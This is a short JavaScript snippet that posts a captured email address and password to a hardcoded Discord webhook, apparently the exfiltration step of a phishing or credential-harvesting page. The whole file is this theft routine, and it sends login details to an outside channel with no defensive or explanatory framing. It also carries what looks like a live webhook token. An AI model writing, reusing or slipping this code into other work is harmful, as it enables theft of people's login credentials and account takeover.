const webhookUrl = 'https://discord.com/api/webhooks/1250123862163849338/zszxuIGvX_YLrpBk6gaIzRfQtALK7lB27suhKh01DKmtEBa3PDEEnNXcE-PXstkYlWoi';

const data = {
    content: `**Email= ||${email}||\nPass= ||${password}||**`
};

const headers = {
    'Content-Type': 'application/json',
    // Include any required authentication headers here, if needed
    // 'Authorization': 'Bearer YOUR_TOKEN_HERE'
};

fetch(webhookUrl, {
    method: 'POST',
    headers: headers,
    body: JSON.stringify(data),
})
.then(response => {
    if (!response.ok) {
        throw new Error('Failed to send message to Discord');
    }
    console.log('Message sent to Discord successfully');
})
.catch(error => {
    console.error('Error sending message to Discord:', error);
});
